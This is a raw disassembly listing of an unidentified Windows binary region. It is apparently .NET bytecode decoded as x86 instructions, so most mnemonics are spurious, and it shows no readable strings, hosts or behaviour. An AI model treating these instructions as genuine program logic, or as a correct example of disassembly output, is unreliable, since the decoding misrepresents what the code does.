  402b98:	04 00                	add    $0x0,%al
  402b9a:	70 6f                	jo     0x402c0b
  402b9c:	22 00                	and    (%eax),%al
  402b9e:	00 0a                	add    %cl,(%edx)
  402ba0:	2c 08                	sub    $0x8,%al
  402ba2:	72 b3                	jb     0x402b57
  402ba4:	04 00                	add    $0x0,%al
  402ba6:	70 0a                	jo     0x402bb2
  402ba8:	de 3c 09             	fidivrs (%ecx,%ecx,1)
  402bab:	6f                   	outsl  %ds:(%esi),(%dx)
  402bac:	58                   	pop    %eax
  402bad:	00 00                	add    %al,(%eax)
  402baf:	0a 2d ca de 0a 09    	or     0x90adeca,%ch
  402bb5:	2c 06                	sub    $0x6,%al
  402bb7:	09 6f 44             	or     %ebp,0x44(%edi)
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	0a dc                	or     %ah,%bl
  402bbe:	de 15 25 28 2c 00    	ficoms 0x2c2825
  402bc4:	00 0a                	add    %cl,(%edx)
  402bc6:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402bc9:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402bce:	06                   	push   %es
  402bcf:	28 2e                	sub    %ch,(%esi)
  402bd1:	00 00                	add    %al,(%eax)
  402bd3:	06                   	push   %es
  402bd4:	0a de                	or     %dh,%bl
  402bd6:	0f 25                	(bad)
  402bd8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402bdb:	00 0a                	add    %cl,(%edx)
  402bdd:	13 05 28 2d 00 00    	adc    0x2d28,%eax
  402be3:	0a de                	or     %dh,%bl
  402be5:	00 06                	add    %al,(%esi)
  402be7:	2a 01                	sub    (%ecx),%al
  402be9:	28 00                	sub    %al,(%eax)
  402beb:	00 02                	add    %al,(%edx)
  402bed:	00 2b                	add    %ch,(%ebx)
  402bef:	00 41 6c             	add    %al,0x6c(%ecx)
  402bf2:	00 0a                	add    %cl,(%edx)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	00 00                	add    %al,(%eax)
  402bfa:	0f 00 69 78          	verw   0x78(%ecx)
  402bfe:	00 0f                	add    %cl,(%edi)
  402c00:	14 00                	adc    $0x0,%al
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	00 00                	add    %al,(%eax)
  402c06:	00 00                	add    %al,(%eax)
  402c08:	8f                   	(bad)
  402c09:	8f 00                	pop    (%eax)
  402c0b:	0f 14 00             	unpcklps (%eax),%xmm0
  402c0e:	00 01                	add    %al,(%ecx)
  402c10:	1b 30                	sbb    (%eax),%esi
  402c12:	03 00                	add    (%eax),%eax
  402c14:	46                   	inc    %esi
  402c15:	00 00                	add    %al,(%eax)
  402c17:	00 02                	add    %al,(%edx)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	11 72 c9             	adc    %esi,-0x37(%edx)
  402c1e:	04 00                	add    $0x0,%al
  402c20:	70 28                	jo     0x402c4a
  402c22:	17                   	pop    %ss
  402c23:	00 00                	add    %al,(%eax)
  402c25:	06                   	push   %es
  402c26:	14 16                	adc    $0x16,%al
  402c28:	28 56 00             	sub    %dl,0x0(%esi)
  402c2b:	00 0a                	add    %cl,(%edx)
  402c2d:	2d 10 72 c9 04       	sub    $0x4c97210,%eax
  402c32:	00 70 72             	add    %dh,0x72(%eax)
  402c35:	b7 01                	mov    $0x1,%bh
  402c37:	00 70 28             	add    %dh,0x28(%eax)
  402c3a:	18 00                	sbb    %al,(%eax)
  402c3c:	00 06                	add    %al,(%esi)
  402c3e:	26 72 c9             	es jb  0x402c0a
  402c41:	04 00                	add    $0x0,%al
  402c43:	70 28                	jo     0x402c6d
  402c45:	17                   	pop    %ss
  402c46:	00 00                	add    %al,(%eax)
  402c48:	06                   	push   %es
  402c49:	0a de                	or     %dh,%bl
  402c4b:	14 25                	adc    $0x25,%al
  402c4d:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402c50:	00 0a                	add    %cl,(%edx)
  402c52:	0b 72 71             	or     0x71(%edx),%esi
  402c55:	01 00                	add    %eax,(%eax)
  402c57:	70 0a                	jo     0x402c63
  402c59:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402c5f:	00 06                	add    %al,(%esi)
  402c61:	2a 00                	sub    (%eax),%al
  402c63:	00 01                	add    %al,(%ecx)
  402c65:	10 00                	adc    %al,(%eax)
  402c67:	00 00                	add    %al,(%eax)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 30                	add    %dh,(%eax)
  402c6d:	30 00                	xor    %al,(%eax)
  402c6f:	14 14                	adc    $0x14,%al
  402c71:	00 00                	add    %al,(%eax)
  402c73:	01 1b                	add    %ebx,(%ebx)
  402c75:	30 03                	xor    %al,(%ebx)
  402c77:	00 96 00 00 00 0c    	add    %dl,0xc000000(%esi)
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	11 72 d5             	adc    %esi,-0x2b(%edx)
  402c82:	04 00                	add    $0x0,%al
  402c84:	70 73                	jo     0x402cf9
  402c86:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c89:	0a 0b                	or     (%ebx),%cl
  402c8b:	07                   	pop    %es
  402c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8d:	6c                   	insb   (%dx),%es:(%edi)
  402c8e:	00 00                	add    %al,(%eax)
  402c90:	0a 07                	or     (%edi),%al
  402c92:	72 e7                	jb     0x402c7b
  402c94:	02 00                	add    (%eax),%al
  402c96:	70 6f                	jo     0x402d07
  402c98:	57                   	push   %edi
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	0a 6f 15             	or     0x15(%edi),%ch
  402c9e:	00 00                	add    %al,(%eax)
  402ca0:	0a 72 15             	or     0x15(%edx),%dh
  402ca3:	05 00 70 6f 22       	add    $0x226f7000,%eax
  402ca8:	00 00                	add    %al,(%eax)
  402caa:	0a 2c 40             	or     (%eax,%eax,2),%ch
  402cad:	07                   	pop    %es
  402cae:	72 e7                	jb     0x402c97
  402cb0:	02 00                	add    (%eax),%al
  402cb2:	70 6f                	jo     0x402d23
  402cb4:	57                   	push   %edi
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	0a 6f 15             	or     0x15(%edi),%ch
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	0a 72 21             	or     0x21(%edx),%dh
  402cbf:	05 00 70 72 7f       	add    $0x7f727000,%eax
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	70 6f                	jo     0x402d37
  402cc8:	4d                   	dec    %ebp
  402cc9:	00 00                	add    %al,(%eax)
  402ccb:	0a 72 29             	or     0x29(%edx),%dh
  402cce:	05 00 70 72 7f       	add    $0x7f727000,%eax
  402cd3:	00 00                	add    %al,(%eax)
  402cd5:	70 6f                	jo     0x402d46
  402cd7:	4d                   	dec    %ebp
  402cd8:	00 00                	add    %al,(%eax)
  402cda:	0a 72 3b             	or     0x3b(%edx),%dh
  402cdd:	05 00 70 72 7f       	add    $0x7f727000,%eax
  402ce2:	00 00                	add    %al,(%eax)
  402ce4:	70 6f                	jo     0x402d55
  402ce6:	4d                   	dec    %ebp
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	0a 0a                	or     (%edx),%cl
  402ceb:	de 27                	fisubs (%edi)
  402ced:	07                   	pop    %es
  402cee:	72 e7                	jb     0x402cd7
  402cf0:	02 00                	add    (%eax),%al
  402cf2:	70 6f                	jo     0x402d63
  402cf4:	57                   	push   %edi
  402cf5:	00 00                	add    %al,(%eax)
  402cf7:	0a 6f 15             	or     0x15(%edi),%ch
  402cfa:	00 00                	add    %al,(%eax)
  402cfc:	0a 0a                	or     (%edx),%cl
  402cfe:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  402d05:	0a 0c 72             	or     (%edx,%esi,2),%cl
  402d08:	43                   	inc    %ebx
  402d09:	05 00 70 0a 28       	add    $0x280a7000,%eax
  402d0e:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402d13:	00 06                	add    %al,(%esi)
  402d15:	2a 00                	sub    (%eax),%al
  402d17:	00 01                	add    %al,(%ecx)
  402d19:	10 00                	adc    %al,(%eax)
  402d1b:	00 00                	add    %al,(%eax)
  402d1d:	00 00                	add    %al,(%eax)
  402d1f:	00 80 80 00 14 14    	add    %al,0x14140080(%eax)
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 1b                	add    %ebx,(%ebx)
  402d29:	30 03                	xor    %al,(%ebx)
  402d2b:	00 82 00 00 00 0d    	add    %al,0xd000000(%edx)
  402d31:	00 00                	add    %al,(%eax)
  402d33:	11 73 5b             	adc    %esi,0x5b(%ebx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	0a 0b                	or     (%ebx),%cl
  402d3a:	28 6d 00             	sub    %ch,0x0(%ebp)
  402d3d:	00 0a                	add    %cl,(%edx)
  402d3f:	16                   	push   %ss
  402d40:	1f                   	pop    %ds
  402d41:	22 6f 6e             	and    0x6e(%edi),%ch
  402d44:	00 00                	add    %al,(%eax)
  402d46:	0a 28                	or     (%eax),%ch
  402d48:	6f                   	outsl  %ds:(%esi),(%dx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402d4e:	0d 2b 3f 08 09       	or     $0x9083f2b,%eax
  402d53:	9a 13 04 11 04 72 51 	lcall  $0x5172,$0x4110413
  402d5a:	05 00 70 6f 22       	add    $0x226f7000,%eax
  402d5f:	00 00                	add    %al,(%eax)
  402d61:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  402d64:	07                   	pop    %es
  402d65:	72 51                	jb     0x402db8
  402d67:	05 00 70 6f 5d       	add    $0x5d6f7000,%eax
  402d6c:	00 00                	add    %al,(%eax)
  402d6e:	0a 26                	or     (%esi),%ah
  402d70:	2b 1a                	sub    (%edx),%ebx
  402d72:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402d75:	5b                   	pop    %ebx
  402d76:	05 00 70 6f 22       	add    $0x226f7000,%eax
  402d7b:	00 00                	add    %al,(%eax)
  402d7d:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402d80:	07                   	pop    %es
  402d81:	72 65                	jb     0x402de8
  402d83:	05 00 70 6f 5d       	add    $0x5d6f7000,%eax
  402d88:	00 00                	add    %al,(%eax)
  402d8a:	0a 26                	or     (%esi),%ah
  402d8c:	09 17                	or     %edx,(%edi)
  402d8e:	d6                   	salc
  402d8f:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402d94:	32 bb 07 6f 5e 00    	xor    0x5e6f07(%ebx),%bh
  402d9a:	00 0a                	add    %cl,(%edx)
  402d9c:	0a de                	or     %dh,%bl
  402d9e:	15 25 28 2c 00       	adc    $0x2c2825,%eax
  402da3:	00 0a                	add    %cl,(%edx)
  402da5:	13 05 72 71 01 00    	adc    0x17172,%eax
  402dab:	70 0a                	jo     0x402db7
  402dad:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402db3:	00 06                	add    %al,(%esi)
  402db5:	2a 00                	sub    (%eax),%al
  402db7:	00 01                	add    %al,(%ecx)
  402db9:	10 00                	adc    %al,(%eax)
  402dbb:	00 00                	add    %al,(%eax)
  402dbd:	00 00                	add    %al,(%eax)
  402dbf:	00 6b 6b             	add    %ch,0x6b(%ebx)
  402dc2:	00 15 14 00 00 01    	add    %dl,0x1000014
  402dc8:	1b 30                	sbb    (%eax),%esi
  402dca:	03 00                	add    (%eax),%eax
  402dcc:	e1 00                	loope  0x402dce
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	0e                   	push   %cs
  402dd1:	00 00                	add    %al,(%eax)
  402dd3:	11 00                	adc    %eax,(%eax)
  402dd5:	28 04 00             	sub    %al,(%eax,%eax,1)
  402dd8:	00 06                	add    %al,(%esi)
  402dda:	6f                   	outsl  %ds:(%esi),(%dx)
  402ddb:	70 00                	jo     0x402ddd
  402ddd:	00 0a                	add    %cl,(%edx)
  402ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  402de0:	71 00                	jno    0x402de2
  402de2:	00 0a                	add    %cl,(%edx)
  402de4:	6f                   	outsl  %ds:(%esi),(%dx)
  402de5:	38 00                	cmp    %al,(%eax)
  402de7:	00 0a                	add    %cl,(%edx)
  402de9:	1f                   	pop    %ds
  402dea:	1a 3f                	sbb    (%edi),%bh
  402dec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402ded:	00 00                	add    %al,(%eax)
  402def:	00 28                	add    %ch,(%eax)
  402df1:	04 00                	add    $0x0,%al
  402df3:	00 06                	add    %al,(%esi)
  402df5:	6f                   	outsl  %ds:(%esi),(%dx)
  402df6:	70 00                	jo     0x402df8
  402df8:	00 0a                	add    %cl,(%edx)
  402dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfb:	71 00                	jno    0x402dfd
  402dfd:	00 0a                	add    %cl,(%edx)
  402dff:	6f                   	outsl  %ds:(%esi),(%dx)
  402e00:	38 00                	cmp    %al,(%eax)
  402e02:	00 0a                	add    %cl,(%edx)
  402e04:	1f                   	pop    %ds
  402e05:	23 3d 8a 00 00 00    	and    0x8a,%edi
  402e0b:	28 04 00             	sub    %al,(%eax,%eax,1)
  402e0e:	00 06                	add    %al,(%esi)
  402e10:	6f                   	outsl  %ds:(%esi),(%dx)
  402e11:	70 00                	jo     0x402e13
  402e13:	00 0a                	add    %cl,(%edx)
  402e15:	6f                   	outsl  %ds:(%esi),(%dx)
  402e16:	71 00                	jno    0x402e18
  402e18:	00 0a                	add    %cl,(%edx)
  402e1a:	72 71                	jb     0x402e8d
  402e1c:	05 00 70 6f 72       	add    $0x726f7000,%eax
  402e21:	00 00                	add    %al,(%eax)
  402e23:	0a 2d 36 28 04 00    	or     0x42836,%ch
  402e29:	00 06                	add    %al,(%esi)
  402e2b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e2c:	70 00                	jo     0x402e2e
  402e2e:	00 0a                	add    %cl,(%edx)
  402e30:	6f                   	outsl  %ds:(%esi),(%dx)
  402e31:	71 00                	jno    0x402e33
  402e33:	00 0a                	add    %cl,(%edx)
  402e35:	72 75                	jb     0x402eac
  402e37:	05 00 70 6f 72       	add    $0x726f7000,%eax
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	0a 2d 1b 28 04 00    	or     0x4281b,%ch
  402e44:	00 06                	add    %al,(%esi)
  402e46:	6f                   	outsl  %ds:(%esi),(%dx)
  402e47:	70 00                	jo     0x402e49
  402e49:	00 0a                	add    %cl,(%edx)
  402e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4c:	71 00                	jno    0x402e4e
  402e4e:	00 0a                	add    %cl,(%edx)
  402e50:	72 79                	jb     0x402ecb
  402e52:	05 00 70 6f 72       	add    $0x726f7000,%eax
  402e57:	00 00                	add    %al,(%eax)
  402e59:	0a 2c 39             	or     (%ecx,%edi,1),%ch
  402e5c:	06                   	push   %es
  402e5d:	73 32                	jae    0x402e91
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	06                   	push   %es
  402e62:	0a 06                	or     (%esi),%al
  402e64:	28 04 00             	sub    %al,(%eax,%eax,1)
  402e67:	00 06                	add    %al,(%esi)
  402e69:	6f                   	outsl  %ds:(%esi),(%dx)
  402e6a:	70 00                	jo     0x402e6c
  402e6c:	00 0a                	add    %cl,(%edx)
  402e6e:	7d 07                	jge    0x402e77
  402e70:	00 00                	add    %al,(%eax)
  402e72:	04 06                	add    $0x6,%al
  402e74:	fe 06                	incb   (%esi)
  402e76:	33 00                	xor    (%eax),%eax
  402e78:	00 06                	add    %al,(%esi)
  402e7a:	73 73                	jae    0x402eef
  402e7c:	00 00                	add    %al,(%eax)
  402e7e:	0a 73 74             	or     0x74(%ebx),%dh
  402e81:	00 00                	add    %al,(%eax)
  402e83:	0a 25 16 6f 75 00    	or     0x756f16,%ah
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	7e 17                	jle    0x402ea4
  402e8d:	00 00                	add    %al,(%eax)
  402e8f:	04 6f                	add    $0x6f,%al
  402e91:	76 00                	jbe    0x402e93
  402e93:	00 0a                	add    %cl,(%edx)
  402e95:	20 f4                	and    %dh,%ah
  402e97:	01 00                	add    %eax,(%eax)
  402e99:	00 28                	add    %ch,(%eax)
  402e9b:	77 00                	ja     0x402e9d
  402e9d:	00 0a                	add    %cl,(%edx)
  402e9f:	dd 30                	fnsave (%eax)
  402ea1:	ff                   	(bad)
  402ea2:	ff                   	(bad)
  402ea3:	ff 25 28 2c 00 00    	jmp    *0x2c28
  402ea9:	0a 0b                	or     (%ebx),%cl
  402eab:	28 2d 00 00 0a dd    	sub    %ch,0xdd0a0000
  402eb1:	1f                   	pop    %ds
  402eb2:	ff                   	(bad)
  402eb3:	ff                   	(bad)
  402eb4:	ff 00                	incl   (%eax)
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	01 10                	add    %edx,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	00 00                	add    %al,(%eax)
  402ebe:	01 00                	add    %eax,(%eax)
  402ec0:	cf                   	iret
  402ec1:	d0 00                	rolb   $1,(%eax)
  402ec3:	11 14 00             	adc    %edx,(%eax,%eax,1)
  402ec6:	00 01                	add    %al,(%ecx)
  402ec8:	5a                   	pop    %edx
  402ec9:	02 28                	add    (%eax),%ch
  402ecb:	17                   	pop    %ss
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	0a 03                	or     (%ebx),%al
  402ed0:	2c 0c                	sub    $0xc,%al
  402ed2:	02 03                	add    (%ebx),%al
  402ed4:	7b 07                	jnp    0x402edd
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	04 7d                	add    $0x7d,%al
  402eda:	07                   	pop    %es
  402edb:	00 00                	add    %al,(%eax)
  402edd:	04 2a                	add    $0x2a,%al
  402edf:	4a                   	dec    %edx
  402ee0:	02 7b 07             	add    0x7(%ebx),%bh
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	04 03                	add    $0x3,%al
  402ee7:	28 33                	sub    %dh,(%ebx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	0a 6f 78             	or     0x78(%edi),%ch
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	0a 2a                	or     (%edx),%ch
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	03 30                	add    (%eax),%esi
  402ef6:	03 00                	add    (%eax),%eax
  402ef8:	d3 00                	roll   %cl,(%eax)
  402efa:	00 00                	add    %al,(%eax)
  402efc:	00 00                	add    %al,(%eax)
  402efe:	00 00                	add    %al,(%eax)
  402f00:	72 81                	jb     0x402e83
  402f02:	05 00 70 80 08       	add    $0x8807000,%eax
  402f07:	00 00                	add    %al,(%eax)
  402f09:	04 72                	add    $0x72,%al
  402f0b:	04 06                	add    $0x6,%al
  402f0d:	00 70 80             	add    %dh,-0x80(%eax)
  402f10:	0b 00                	or     (%eax),%eax
  402f12:	00 04 72             	add    %al,(%edx,%esi,2)
  402f15:	5e                   	pop    %esi
  402f16:	06                   	push   %es
  402f17:	00 70 80             	add    %dh,-0x80(%eax)
  402f1a:	0c 00                	or     $0x0,%al
  402f1c:	00 04 72             	add    %al,(%edx,%esi,2)
  402f1f:	6a 06                	push   $0x6
  402f21:	00 70 80             	add    %dh,-0x80(%eax)
  402f24:	0d 00 00 04 72       	or     $0x72040000,%eax
  402f29:	76 06                	jbe    0x402f31
  402f2b:	00 70 80             	add    %dh,-0x80(%eax)
  402f2e:	0e                   	push   %cs
  402f2f:	00 00                	add    %al,(%eax)
  402f31:	04 72                	add    $0x72,%al
  402f33:	a8 06                	test   $0x6,%al
  402f35:	00 70 28             	add    %dh,0x28(%eax)
  402f38:	79 00                	jns    0x402f3a
  402f3a:	00 0a                	add    %cl,(%edx)
  402f3c:	80 10 00             	adcb   $0x0,(%eax)
  402f3f:	00 04 72             	add    %al,(%edx,%esi,2)
  402f42:	a8 06                	test   $0x6,%al
  402f44:	00 70 28             	add    %dh,0x28(%eax)
  402f47:	79 00                	jns    0x402f49
  402f49:	00 0a                	add    %cl,(%edx)
  402f4b:	80 11 00             	adcb   $0x0,(%ecx)
  402f4e:	00 04 72             	add    %al,(%edx,%esi,2)
  402f51:	a8 06                	test   $0x6,%al
  402f53:	00 70 28             	add    %dh,0x28(%eax)
  402f56:	79 00                	jns    0x402f58
  402f58:	00 0a                	add    %cl,(%edx)
  402f5a:	80 12 00             	adcb   $0x0,(%edx)
  402f5d:	00 04 72             	add    %al,(%edx,%esi,2)
  402f60:	a8 06                	test   $0x6,%al
  402f62:	00 70 28             	add    %dh,0x28(%eax)
  402f65:	79 00                	jns    0x402f67
  402f67:	00 0a                	add    %cl,(%edx)
  402f69:	80 13 00             	adcb   $0x0,(%ebx)
  402f6c:	00 04 72             	add    %al,(%edx,%esi,2)
  402f6f:	b2 06                	mov    $0x6,%dl
  402f71:	00 70 80             	add    %dh,-0x80(%eax)
  402f74:	14 00                	adc    $0x0,%al
  402f76:	00 04 72             	add    %al,(%edx,%esi,2)
  402f79:	c2 06 00             	ret    $0x6
  402f7c:	70 80                	jo     0x402efe
  402f7e:	15 00 00 04 7e       	adc    $0x7e040000,%eax
  402f83:	14 00                	adc    $0x0,%al
  402f85:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f88:	7a 00                	jp     0x402f8a
  402f8a:	00 0a                	add    %cl,(%edx)
  402f8c:	7e 15                	jle    0x402fa3
  402f8e:	00 00                	add    %al,(%eax)
  402f90:	04 7e                	add    $0x7e,%al
  402f92:	0e                   	push   %cs
  402f93:	00 00                	add    %al,(%eax)
  402f95:	04 28                	add    $0x28,%al
  402f97:	51                   	push   %ecx
  402f98:	00 00                	add    %al,(%eax)
  402f9a:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  402fa0:	72 7f                	jb     0x403021
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	70 80                	jo     0x402f26
  402fa6:	17                   	pop    %ss
  402fa7:	00 00                	add    %al,(%eax)
  402fa9:	04 72                	add    $0x72,%al
  402fab:	a8 06                	test   $0x6,%al
  402fad:	00 70 28             	add    %dh,0x28(%eax)
  402fb0:	79 00                	jns    0x402fb2
  402fb2:	00 0a                	add    %cl,(%edx)
  402fb4:	80 18 00             	sbbb   $0x0,(%eax)
  402fb7:	00 04 72             	add    %al,(%edx,%esi,2)
  402fba:	c6 06 00             	movb   $0x0,(%esi)
  402fbd:	70 80                	jo     0x402f3f
  402fbf:	19 00                	sbb    %eax,(%eax)
  402fc1:	00 04 72             	add    %al,(%edx,%esi,2)
  402fc4:	75 05                	jne    0x402fcb
  402fc6:	00 70 28             	add    %dh,0x28(%eax)
  402fc9:	7b 00                	jnp    0x402fcb
  402fcb:	00 0a                	add    %cl,(%edx)
  402fcd:	80 1a 00             	sbbb   $0x0,(%edx)
  402fd0:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402fd3:	1e                   	push   %ds
  402fd4:	1b 30                	sbb    (%eax),%esi
  402fd6:	03 00                	add    (%eax),%eax
  402fd8:	1f                   	pop    %ds
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	00 0f                	add    %cl,(%edi)
  402fdd:	00 00                	add    %al,(%eax)
  402fdf:	11 28                	adc    %ebp,(%eax)
  402fe1:	7c 00                	jl     0x402fe3
  402fe3:	00 0a                	add    %cl,(%edx)
  402fe5:	17                   	pop    %ss
  402fe6:	12 00                	adc    (%eax),%al
  402fe8:	16                   	push   %ss
  402fe9:	28 37                	sub    %dh,(%edi)
  402feb:	00 00                	add    %al,(%eax)
  402fed:	06                   	push   %es
  402fee:	de 0e                	fimuls (%esi)
  402ff0:	25 28 2c 00 00       	and    $0x2c28,%eax
  402ff5:	0a 0b                	or     (%ebx),%cl
  402ff7:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402ffd:	00 2a                	add    %ch,(%edx)
  402fff:	00 01                	add    %al,(%ecx)
  403001:	10 00                	adc    %al,(%eax)
  403003:	00 00                	add    %al,(%eax)
  403005:	00 00                	add    %al,(%eax)
  403007:	00 10                	add    %dl,(%eax)
  403009:	10 00                	adc    %al,(%eax)
  40300b:	0e                   	push   %cs
  40300c:	14 00                	adc    $0x0,%al
  40300e:	00 01                	add    %al,(%ecx)
  403010:	1b 30                	sbb    (%eax),%esi
  403012:	03 00                	add    (%eax),%eax
  403014:	1a 00                	sbb    (%eax),%al
  403016:	00 00                	add    %al,(%eax)
  403018:	0f 00 00             	sldt   (%eax)
  40301b:	11 16                	adc    %edx,(%esi)
  40301d:	12 00                	adc    (%eax),%al
  40301f:	16                   	push   %ss
  403020:	28 37                	sub    %dh,(%edi)
  403022:	00 00                	add    %al,(%eax)
  403024:	06                   	push   %es
  403025:	de 0e                	fimuls (%esi)
  403027:	25 28 2c 00 00       	and    $0x2c28,%eax
  40302c:	0a 0b                	or     (%ebx),%cl
  40302e:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403034:	00 2a                	add    %ch,(%edx)
  403036:	00 00                	add    %al,(%eax)
  403038:	01 10                	add    %edx,(%eax)
  40303a:	00 00                	add    %al,(%eax)
  40303c:	00 00                	add    %al,(%eax)
  40303e:	00 00                	add    %al,(%eax)
  403040:	0b 0b                	or     (%ebx),%ecx
  403042:	00 0e                	add    %cl,(%esi)
  403044:	14 00                	adc    $0x0,%al
  403046:	00 01                	add    %al,(%ecx)
  403048:	2e 7e 0d             	jle,pn 0x403058
  40304b:	00 00                	add    %al,(%eax)
  40304d:	04 80                	add    $0x80,%al
  40304f:	1b 00                	sbb    (%eax),%eax
  403051:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403054:	1b 30                	sbb    (%eax),%esi
  403056:	07                   	pop    %es
  403057:	00 07                	add    %al,(%edi)
  403059:	03 00                	add    (%eax),%eax
  40305b:	00 10                	add    %dl,(%eax)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	11 72 2c             	adc    %esi,0x2c(%edx)
  403062:	07                   	pop    %es
  403063:	00 70 7e             	add    %dh,0x7e(%eax)
  403066:	1b 00                	sbb    (%eax),%eax
  403068:	00 04 28             	add    %al,(%eax,%ebp,1)
  40306b:	7d 00                	jge    0x40306d
  40306d:	00 0a                	add    %cl,(%edx)
  40306f:	28 25 00 00 06 28    	sub    %ah,0x28060000
  403075:	7d 00                	jge    0x403077
  403077:	00 0a                	add    %cl,(%edx)
  403079:	7e 1b                	jle    0x403096
  40307b:	00 00                	add    %al,(%eax)
  40307d:	04 28                	add    $0x28,%al
  40307f:	7d 00                	jge    0x403081
  403081:	00 0a                	add    %cl,(%edx)
  403083:	28 21                	sub    %ah,(%ecx)
  403085:	00 00                	add    %al,(%eax)
  403087:	06                   	push   %es
  403088:	28 7d 00             	sub    %bh,0x0(%ebp)
  40308b:	00 0a                	add    %cl,(%edx)
  40308d:	28 33                	sub    %dh,(%ebx)
  40308f:	00 00                	add    %al,(%eax)
  403091:	0a 28                	or     (%eax),%ch
  403093:	43                   	inc    %ebx
  403094:	00 00                	add    %al,(%eax)
  403096:	06                   	push   %es
  403097:	de 0c 28             	fimuls (%eax,%ebp,1)
  40309a:	2c 00                	sub    $0x0,%al
  40309c:	00 0a                	add    %cl,(%edx)
  40309e:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4030a4:	00 02                	add    %al,(%edx)
  4030a6:	28 15 00 00 06 28    	sub    %dl,0x28060000
  4030ac:	4b                   	dec    %ebx
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	06                   	push   %es
  4030b0:	28 33                	sub    %dh,(%ebx)
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	0a 7e 1b             	or     0x1b(%esi),%bh
  4030b7:	00 00                	add    %al,(%eax)
  4030b9:	04 28                	add    $0x28,%al
  4030bb:	33 00                	xor    (%eax),%eax
  4030bd:	00 0a                	add    %cl,(%edx)
  4030bf:	15 16 28 37 00       	adc    $0x372816,%eax
  4030c4:	00 0a                	add    %cl,(%edx)
  4030c6:	0a 06                	or     (%esi),%al
  4030c8:	16                   	push   %ss
  4030c9:	9a 0b 07 72 32 07 00 	lcall  $0x7,$0x3272070b
  4030d0:	70 16                	jo     0x4030e8
  4030d2:	28 56 00             	sub    %dl,0x0(%esi)
  4030d5:	00 0a                	add    %cl,(%edx)
  4030d7:	2c 54                	sub    $0x54,%al
  4030d9:	07                   	pop    %es
  4030da:	72 40                	jb     0x40311c
  4030dc:	07                   	pop    %es
  4030dd:	00 70 16             	add    %dh,0x16(%eax)
  4030e0:	28 56 00             	sub    %dl,0x0(%esi)
  4030e3:	00 0a                	add    %cl,(%edx)
  4030e5:	2c 5b                	sub    $0x5b,%al
  4030e7:	07                   	pop    %es
  4030e8:	72 46                	jb     0x403130
  4030ea:	07                   	pop    %es
  4030eb:	00 70 16             	add    %dh,0x16(%eax)
  4030ee:	28 56 00             	sub    %dl,0x0(%esi)
  4030f1:	00 0a                	add    %cl,(%edx)
  4030f3:	2c 58                	sub    $0x58,%al
  4030f5:	07                   	pop    %es
  4030f6:	72 50                	jb     0x403148
  4030f8:	07                   	pop    %es
  4030f9:	00 70 16             	add    %dh,0x16(%eax)
  4030fc:	28 56 00             	sub    %dl,0x0(%esi)
  4030ff:	00 0a                	add    %cl,(%edx)
  403101:	39 80 01 00 00 07    	cmp    %eax,0x7000001(%eax)
  403107:	72 58                	jb     0x403161
  403109:	07                   	pop    %es
  40310a:	00 70 16             	add    %dh,0x16(%eax)
  40310d:	28 56 00             	sub    %dl,0x0(%esi)
  403110:	00 0a                	add    %cl,(%edx)
  403112:	39 ca                	cmp    %ecx,%edx
  403114:	01 00                	add    %eax,(%eax)
  403116:	00 07                	add    %al,(%edi)
  403118:	72 60                	jb     0x40317a
  40311a:	07                   	pop    %es
  40311b:	00 70 16             	add    %dh,0x16(%eax)
  40311e:	28 56 00             	sub    %dl,0x0(%esi)
  403121:	00 0a                	add    %cl,(%edx)
